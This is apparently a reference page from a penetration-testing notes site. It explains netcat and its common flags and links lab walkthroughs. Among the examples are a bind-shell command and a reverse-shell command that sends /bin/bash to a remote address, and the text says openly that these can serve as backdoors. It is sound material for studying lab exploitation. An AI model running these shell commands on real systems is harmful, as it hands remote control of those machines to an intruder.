.. _netcat:

Netcat: The Network Swiss-Army Knife
====================================

.. index:: !netcat

+-----------+--------------------------------------+
|**OS**     | All major operating systems.         |
+-----------+--------------------------------------+
|**Website**| https://nc110.sourceforge.io/        |
+-----------+--------------------------------------+

+------------+---------------------------------------------------+
|                  **Reference  Walk-Throughs**                  |
+============+===================================================+
|`HackTheBox`|:ref:`Lame <Lame Exploitation>`                    |
+------------+---------------------------------------------------+
|`VulnHub`   |:ref:`Kioptrix Level 1 <Kioptrix Lv1 Samba>`       |
+------------+---------------------------------------------------+

+----------+------------------------------------+
| See Also |:ref:`Netcat Shells <Netcat Shells>`|
+----------+------------------------------------+


What is netcat?
---------------
From the `homepage <https://nc110.sourceforge.io/>`_:

  `Netcat` is a simple Unix utility which reads and writes data across network connections, using TCP or UDP protocol.

While `netcat` might sound like a simple utility (it is), it is useful for an incredibly broad variety of network applications. For this reason, it has become an essential part of every hacker's toolkit.

`Netcat` was originally written for Unix-like systems. However, it has been ported to pretty much every OS on the planet.


How does it work?
-----------------
`Netcat` establishes raw TCP and UDP connections and allows you to interact with those connections manually (via standard input and output) or via scripts. Where most similar utilities (such as `telnet`) terminate the connection upon receipt of an "End-of-File" (EOF) byte, `netcat` instead keeps the connection open, transmitting and receiving data until the connection is broken by the network (or manually closed).

`Netcat` can also act as a server, binding to a specific port and listening for incoming connections. It can be scripted or accessed manually, regardless of whether it's used as client or server.


Using netcat
------------
To use `netcat`, simply type ``nc`` on the command line, along with whatever arguments you wish to pass. Examples:

.. code-block:: none

    nc -vnlp 6666
    nc google.com 80
    nc -vn -w 3 10.10.10.3 6200
    nc -nlp 6666 -e /bin/bash

At a minimum, `netcat` requires an IP and port number when running as a client, or a port number when running as a server.


``-e``: Pipe an Executable
~~~~~~~~~~~~~~~~~~~~~~~~~~
**Example:** ``nc -e /bin/bash 10.10.14.15 6666``

The ``-e`` flag tells `netcat` to bind the specified executable to the established network connection. Incoming data from the network is sent to the executable's standard input, and standard output is sent back over the network. This functionality can be used to establish backdoors in systems, among other actions. This is why the ``-e`` flag is commonly referred to as the "gaping security hole" in `netcat`, despite working exactly as intended.

.. note::

   Most modern OSes ship with a modified version of `netcat` with the ``-e`` option disabled, so as to close the "gaping security hole." However, even with these altered versions, `netcat` can be used as a backdoor; it just takes a little more effort.


``-l`` and ``-p``: Bind and Listen on Port
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
**Example:** ``nc -lp 6666``

Using the ``-l`` flag tells `netcat` to bind and listen on the port specified by the ``-p`` flag.

.. note::

   On most OSes, ports 0 through 1023 are reserved for privileged services, and require administrative privileges before they can be bound. If you wish to use `netcat` on one of these ports, you'll need to do so as a privileged user (such as ``root``).


``-n``: Skip DNS Name Resolution
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
**Example:** ``nc -n 10.10.10.3 21``

When `netcat` establishes a connection to a remote system, it may attempt to perform DNS resolution for the provided host name. When providing an IP, you can skip this name resolution by using the ``-n`` flag.


``-v``: Verbose Output
~~~~~~~~~~~~~~~~~~~~~~
**Example:** ``nc -v 10.10.10.3 6200``

Typically, the only output `netcat` provides is the output sent from the network. The ``-v`` flag tells `netcat` to provide more verbose output, including data about the status of the connection. It can be helpful for understanding more about what's going on behind the scenes.


``-w``: Close Connection After Time-Out
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
**Example:** ``nc -v -w3 10.10.10.3 6200``

After establishing a connection, `netcat` will leave the connection open for as long as you allow it to run, or until the network closes the connection. This can be troublesome when you want `netcat` to close when data is no longer being sent.

In order to close a `netcat` connection automatically, you can specify a time-out value using the ``-w`` flag, which tells `netcat` how long to wait before closing an inactive connection.
